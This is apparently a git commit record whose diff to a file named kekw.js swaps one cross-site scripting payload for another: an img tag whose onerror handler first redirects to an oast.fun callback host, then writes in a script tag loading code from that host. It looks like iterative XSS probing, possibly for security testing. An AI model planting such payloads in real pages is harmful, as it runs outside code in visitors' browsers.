5172b31bb5830cc9f7cb48afb3f21fac86f35f95
w33ts <me@w33t.io>
2024-09-13 20:15:45 -0500

    AHHHHHHHHHHHHHHHHHH

--- kekw.js
+++ kekw.js
@@ -1,1 +1,1 @@
-<img src=x onerror="location.href='tbqimzzddwayopfmucrnud4kg540pi068.oast.fun'">
+<img src="xasdasdasd" onerror="document.write('<script src="tbqimzzddwayopfmucrnud4kg540pi068.oast.fun"></script>')"/>
